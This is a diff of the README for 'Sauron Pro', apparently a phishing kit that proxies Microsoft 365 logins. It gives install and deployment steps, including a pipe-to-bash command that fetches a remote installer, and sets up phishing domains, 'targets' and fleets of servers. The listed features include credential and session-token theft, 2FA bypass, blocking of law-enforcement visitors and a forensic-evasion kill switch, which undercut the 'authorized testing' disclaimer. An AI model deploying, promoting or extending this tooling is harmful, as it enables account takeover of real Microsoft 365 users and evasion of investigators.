@@ -1,177 +1,149 @@
+# Sauron Pro - Advanced Microsoft 365 MITM Proxy
 
-# Sauron - Microsoft 365 MITM Proxy
+[![Release](https://img.shields.io/github/v/release/Skillz147/Sauron-Pro)](https://github.com/Skillz147/Sauron-Pro/releases)
+[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Documentation](https://img.shields.io/badge/docs-available-brightgreen.svg)](https://skillz147.github.io/Sauron-Pro)
 
-Microsoft 365 login flow interception for credential capture and session harvesting.
+Professional-grade Microsoft 365 login flow interception for authorized security testing, credential capture, and session harvesting with enterprise-level infrastructure capabilities.
 
-## 🎯 What It Does
+---
 
-- **Captures Credentials**: Real-time username/password capture
-- **Steals Sessions**: Microsoft authentication cookies and tokens
-- **2FA Bypass**: Multi-factor authentication token harvesting
-- **Live Monitoring**: WebSocket dashboard for real-time operations
-- **SSL Automation**: Automatic HTTPS certificates
-- **Fleet Management**: Deploy and control multiple VPS instances from central master controller
+## ✨ Key Features
+
+🔐 **Credential Capture** - Real-time username/password interception  
+🍪 **Session Harvesting** - Microsoft authentication cookies and tokens  
+🔓 **2FA Bypass** - Multi-factor authentication token capture  
+📊 **Live Monitoring** - WebSocket dashboard for real-time operations  
+🌐 **SSL Automation** - Automatic HTTPS certificates via Let's Encrypt  
+🚀 **Fleet Management** - Centralized control of multiple VPS instances  
+🔍 **Victim Monitoring** - Advanced law enforcement detection system  
+🔴 **Kill Switch** - Emergency VPS destruction with forensic evasion
+
+---
 
 ## 🚀 Installation
 
 ### Requirements
 
 - Ubuntu 20.04+ VPS with root access
-- Domain name pointed to your server
-- Cloudflare account (free tier works)
-- **Firebase project with Firestore enabled**
-- **Firebase Admin SDK service account key (`firebaseAdmin.json`)**
+- Domain name (any registrar)
+- Cloudflare account (free tier)
+- Firebase project with Firestore enabled
 
-### Production Release (Linux VPS)
+### Option 1: One-Command Installation
 
 ```bash
-# 1. Download the latest Linux release
+# Download and auto-install
+wget -O - https://raw.githubusercontent.com/Skillz147/Sauron-Pro/main/install.sh | sudo bash
+```
+
+### Option 2: Manual Installation
+
+```bash
+# Download latest release
 wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz
+tar -xzf sauron-linux-amd64.tar.gz && cd sauron
 
-# 2. Extract and install
-tar -xzf sauron-linux-amd64.tar.gz
-cd sauron
+# Add Firebase Admin SDK key (from Firebase Console)
+cp /path/to/firebaseAdmin.json .
 
-# 3. Add your Firebase Admin SDK key
-# Download firebaseAdmin.json from your Firebase project console
-# and place it in the sauron directory
-cp /path/to/your/firebaseAdmin.json .
-
-# 4. One-command setup (handles everything automatically)
+# Install and configure
 sudo ./install-production.sh
-
-# 5. Get help anytime
-./help.sh
 ```
 
-**That's it!** The installer will:
+---
 
-- Install Docker and system dependencies automatically
-- Walk you through Cloudflare setup step-by-step
-- Configure SSL certificates with Let's Encrypt
-- Start Sauron service automatically
-
-### 🎯 Quick Help
-
-```bash
-# Show all available commands and current status
-./help.sh
-```
-
-This command shows you:
-
-- ✅ All available management commands
-- ✅ Configuration and troubleshooting options  
-- ✅ Current system status
-- ✅ Quick actions and emergency commands
-
-- Install Docker and system dependencies automatically
-- Walk you through Cloudflare setup step-by-step
-- Configure SSL certificates with Let's Encrypt
-- Start Sauron service automatically
-
-### 🔧 Configuration Management
-
-**Interactive Configuration Setup:**
-
-```bash
-# Run interactive configuration wizard
-./configure-env.sh
-
-# Validate current configuration
-./configure-env.sh --check
-
-# Show configuration status
-./configure-env.sh --status
-```
-
-**Manual Configuration:**
-Edit `.env` file with your settings:
-
-```bash
-# Your phishing domain
-SAURON_DOMAIN=securelogin365.com
-
-# Cloudflare API token (for SSL automation)
-CLOUDFLARE_API_TOKEN=your_token_here
-
-# Turnstile secret (optional bot protection)
-TURNSTILE_SECRET=your_secret_here
-```
-
-### 🔄 Updates
-
-**Automatic Updates:**
-
-```bash
-# Check for and install updates automatically
-sudo ./update-sauron.sh --force
-
-# Check for updates without installing
-sudo ./update-sauron.sh --check
-```
-
-## �📱 Usage
+## 🎯 Usage & Access
 
 ### Access Points
 
 - **Admin Panel**: `https://yourdomain.com/admin`
-- **Statistics**: `https://yourdomain.com/stats`
-- **WebSocket**: `wss://yourdomain.com/ws`
+- **Operations**: `https://login.yourdomain.com/your-slug`
+- **Monitoring**: `https://yourdomain.com/stats`
 
-### Creating Operations
-
-1. Open admin panel: `https://yourdomain.com/admin`
-2. Create a new slug (operation identifier)
-3. Send targets to: `https://login.yourdomain.com/your-slug`
-
-### Management Commands
+### Quick Help
 
 ```bash
-# Check status
-sudo systemctl status sauron
-
-# View logs
-sudo journalctl -u sauron -f
-
-# Restart service
-sudo systemctl restart sauron
-
-# Check version
-/usr/local/bin/sauron --version
-
-# Full system verification
-./verify-installation.sh
-
-# Test Firebase connectivity
-./test-firebase.sh
+# Get complete help and system status
+./help.sh
 ```
 
-### 🔧 Configuration Helpers
+---
+
+## ⚙️ Configuration
+
+### Interactive Setup
 
 ```bash
-# Interactive configuration wizard (default)
+# Run configuration wizard
 ./configure-env.sh
 
-# Quick status check
-./configure-env.sh --status
-
-# Validate configuration
-./configure-env.sh --check
-
-# Test domain connectivity
-./configure-env.sh --test-domain
-
-# Check SSL certificates
-./configure-env.sh --check-ssl
-
-# Show current configuration
-./configure-env.sh show
+# Configuration options
+./configure-env.sh --status     # Show current status
+./configure-env.sh --check      # Validate configuration
+./configure-env.sh --test-domain # Test domain connectivity
+./configure-env.sh --check-ssl  # Check SSL certificates
 ```
+
+### Manual Configuration
+
+Edit `.env` file with your settings:
+
+```bash
+SAURON_DOMAIN=securelogin365.com
+CLOUDFLARE_API_TOKEN=your_token_here
+TURNSTILE_SECRET=your_secret_here
+```
+
+---
+
+## 🔧 System Management
+
+### Service Control
+
+```bash
+# Service operations
+sudo systemctl status sauron    # Check service status
+sudo systemctl restart sauron   # Restart service
+sudo systemctl stop sauron      # Stop service
+
+# View logs
+sudo journalctl -u sauron -f    # Live service logs
+tail -f logs/system.log         # System logs
+tail -f logs/emits.log          # Capture logs
+```
+
+### System Operations
+
+```bash
+# System verification
+./verify-installation.sh        # Full system check
+./test-firebase.sh              # Test Firebase connectivity
+
+# Updates
+sudo ./update-sauron.sh --check # Check for updates
+sudo ./update-sauron.sh --force # Install updates
+
+# Version info
+/usr/local/bin/sauron --version # Check version
+```
+
+---
 
 ## 🆘 Troubleshooting
 
-### Common Issues & Quick Fixes
+### Quick Diagnostics
+
+```bash
+# System status check
+sudo systemctl status sauron && echo "✅ Service OK" || echo "❌ Service FAILED"
+
+# Network connectivity
+dig yourdomain.com              # DNS resolution
+curl -I https://yourdomain.com  # Domain connectivity
+```
+
+### Common Issues
 
 #### 🔴 Service won't start
 
@@ -187,7 +159,7 @@ sudo journalctl -u sauron --no-pager -l
 ./configure-env.sh --check
 ```
 
-#### 🔴 "Domain not reachable" errors
+#### 🔴 Domain not reachable
 
 ```bash
 # Test DNS resolution
@@ -213,96 +185,71 @@ sudo acme.sh --renew -d yourdomain.com
 sudo journalctl -u acme.sh -f
 ```
 
-#### 🔴 Configuration problems
-
-```bash
-# Run configuration wizard
-./configure-env.sh
-
-# Reset to defaults
-cp .env.example .env
-./configure-env.sh
-```
-
 #### 🔴 Firebase connection issues
 
 ```bash
 # Test Firebase connectivity
 ./test-firebase.sh
 
-# Check Firebase credentials file exists
+# Check Firebase credentials file
 ls -la firebaseAdmin.json
 
 # Verify Firestore logs
 grep -i "firebase\|firestore" logs/system.log
-
-# If firebaseAdmin.json is missing:
-# 1. Go to Firebase Console: https://console.firebase.google.com
-# 2. Select your project
-# 3. Go to Project Settings > Service Accounts
-# 4. Generate new private key
-# 5. Download as firebaseAdmin.json
-# 6. Upload to your server's sauron directory
 ```
 
-## � Fleet Management System
+**If firebaseAdmin.json is missing:**
 
-**NEW**: Deploy and control multiple Sauron-Pro instances across different VPS servers from a centralized master controller.
+1. Go to [Firebase Console](https://console.firebase.google.com)
+2. Select your project → Project Settings → Service Accounts
+3. Generate new private key → Download as firebaseAdmin.json
+4. Upload to your server's sauron directory
 
-### 🏛️ Architecture
+---
 
-- **Master Controller**: Single server that manages the entire VPS fleet
-- **VPS Agents**: Individual Sauron instances that register with the master
-- **Distributed MITM**: Coordinate operations across multiple geographic locations
-- **Centralized Control**: Manage all VPS instances from one admin interface
+## 🏗️ Advanced Features
 
-### 📋 Quick Deployment
+### Fleet Management
 
-**Deploy Master Controller:**
+Deploy and control multiple VPS instances from a central master:
 
 ```bash
-# Set your master domain
-export DOMAIN=master.example.com
-sudo ./deploy-fleet-master.sh
+# Deploy master controller
+export DOMAIN=master.example.com && sudo ./deploy-fleet-master.sh
+
+# Deploy VPS agents
+export MASTER_URL=https://master.example.com:8443 && sudo ./deploy-vps-agent.sh
+
+# Fleet management commands
+/opt/sauron-pro/bin/fleet-status                    # View all VPS instances
+/opt/sauron-pro/bin/fleet-command vps-001 status    # Send commands to specific VPS
+/opt/sauron-pro/bin/fleet-command vps-001 restart   # Restart specific VPS
 ```
 
-**Deploy VPS Agents (on each VPS):**
+### Victim Monitoring System
 
-```bash
-# Point to your master controller
-export MASTER_URL=https://admin.example.com:8443
-export VPS_ID=vps-001
-sudo ./deploy-vps-agent.sh
-```
+Advanced law enforcement detection with automatic blocking:
 
-### 🎮 Fleet Management
+- Government email detection (`.gov`, `.mil`)
+- Law enforcement IP range monitoring
+- Automated tool signature detection
+- Real-time threat classification and response
 
-```bash
-# View all VPS instances
-/opt/sauron-pro/bin/fleet-status
+### Kill Switch System
 
-# Send commands to specific VPS
-/opt/sauron-pro/bin/fleet-command vps-001 status
-/opt/sauron-pro/bin/fleet-command vps-001 restart
-/opt/sauron-pro/bin/fleet-command vps-001 script '{"script": "update.sh"}'
+Emergency VPS destruction with 5-stage annihilation:
 
-# Execute on all active VPS
-for vps in $(curl -s https://master.example.com:8443/fleet/instances | jq -r '.instances[] | select(.status=="active") | .id'); do
-  /opt/sauron-pro/bin/fleet-command $vps script '{"script": "cleanup.sh"}'
-done
-```
+- Memory purge and data obliteration
+- System corruption and hardware destruction
+- Dead man's switch with automatic failsafe
+- Zero forensic trace protocols
 
-### 📖 Complete Documentation
-
-- **[Fleet Management Guide](docs/FLEET_MANAGEMENT.md)** - Complete setup and usage
-- **[Fleet Management Dashboard](docs/fleet-management.html)** - Interactive web documentation
+---
 
 ## 🛠️ Development
 
-### Building Releases
-
 ```bash
-# Build binary release package (auto-versioned)
+# Build binary release package
 ./scripts/build-release.sh
 
 # Build with specific version
@@ -312,80 +259,55 @@ done
 ./scripts/deploy-production.sh
 ```
 
-### Development Build (Source Access)
+---
+
+## 🚫 Uninstallation
 
 ```bash
-# Only if you have source code access
-git clone https://github.com/Skillz147/Sauron-Pro.git
-cd Sauron-Pro
-sudo ./install/setup.sh
+# Complete removal command
+sudo systemctl stop sauron.service 2>/dev/null; sudo systemctl disable sauron.service 2>/dev/null; sudo rm -f /etc/systemd/system/sauron.service; sudo rm -f /usr/local/bin/sauron*; sudo rm -rf /opt/sauron /var/lib/sauron /etc/sauron /home/sauron /root/sauron /tmp/sauron*; sudo pkill -f sauron 2>/dev/null; sudo systemctl daemon-reload; echo "✅ Sauron removed!"
 ```
-
-### Project Structure
-
-- `scripts/` - Build and deployment automation scripts
-- `docs/` - Documentation and API reference
-- `.env.example` - Configuration template
-- `LICENSE` - MIT license with security tool disclaimers
-- **Note**: Source code is not included in this repository for security purposes
-
-## 📚 Documentation
-
-**[📖 Full Documentation](https://skillz147.github.io/Sauron-Pro)**
-
-Includes:
-
-- Advanced configuration options
-- API endpoint documentation
-- Troubleshooting guides
-- Security best practices
-
-## ⚠️ Legal Notice & Disclaimer
-
-### IMPORTANT: READ BEFORE USE
-
-This software is provided for **educational and authorized security testing purposes only**. By downloading, installing, or using this software, you acknowledge and agree to the following:
-
-### 🔒 Authorized Use Only
-
-- This tool is intended **ONLY** for authorized penetration testing, security research, and educational purposes
-- You must have **explicit written permission** from the target system owner before use
-- Unauthorized access to computer systems is **illegal** and may violate local, state, federal, and international laws
-
-### 🚫 Prohibited Activities
-
-- **DO NOT** use this software for unauthorized access to any system
-- **DO NOT** use this software for malicious purposes, fraud, or illegal activities
-- **DO NOT** use this software to violate any applicable laws or regulations
-
-### 🛡️ Disclaimer of Liability
-
-- The authors and contributors provide this software **"AS IS"** without any warranties
-- **NO LIABILITY** is accepted for any damages, losses, or legal consequences resulting from use
-- Users assume **FULL RESPONSIBILITY** for compliance with applicable laws
-- The authors **DISCLAIM ALL LIABILITY** for misuse of this software
-
-### 📋 User Responsibilities
-
-- Verify legal compliance in your jurisdiction before use
-- Obtain proper authorization before conducting any security tests
-- Use responsibly and ethically in accordance with applicable laws
-- Report vulnerabilities through proper disclosure channels
-
-### 🏛️ Jurisdiction & Compliance
-
-- Users are responsible for compliance with all applicable laws including but not limited to:
-  - Computer Fraud and Abuse Act (CFAA)
-  - Digital Millennium Copyright Act (DMCA)
-  - General Data Protection Regulation (GDPR)
-  - Local privacy and cybersecurity regulations
-
-**By using this software, you acknowledge that you have read, understood, and agree to be bound by these terms.**
-
-## 📄 License
-
-This project is licensed under the MIT License with additional security tool disclaimers - see the [LICENSE](LICENSE) file for details.
 
 ---
 
-**For questions or issues, check the documentation or open a GitHub issue.**
+## 📚 Documentation
+
+| Guide | Description |
+|-------|-------------|
+| [Setup Guide](docs/setup-guide.html) | Complete installation walkthrough |
+| [Victim Monitoring](docs/victim-monitoring.html) | LE detection system |
+| [Fleet Management](docs/fleet-management.html) | Multi-VPS control |
+| [Kill Switch](docs/kill-switch.html) | Emergency procedures |
+| [API Reference](docs/admin-api.html) | Administrative endpoints |
+
+**📖 [Complete Documentation](https://skillz147.github.io/Sauron-Pro)**
+
+---
+
+## ⚠️ Legal Disclaimer
+
+### FOR AUTHORIZED SECURITY TESTING ONLY
+
+This software is intended exclusively for:
+
+- Authorized penetration testing
+- Educational security research  
+- Legitimate security assessments
+
+**Requirements:**
+
+- Explicit written permission from target system owners
+- Compliance with all applicable laws and regulations
+- Responsible disclosure of discovered vulnerabilities
+
+**The authors disclaim all liability for unauthorized or illegal use.**
+
+---
+
+## 📄 License
+
+MIT License with Security Tool Disclaimers - see [LICENSE](LICENSE) for details.
+
+---
+
+**🔗 [Documentation](https://skillz147.github.io/Sauron-Pro) • [Releases](https://github.com/Skillz147/Sauron-Pro/releases) • [Issues](https://github.com/Skillz147/Sauron-Pro/issues)**
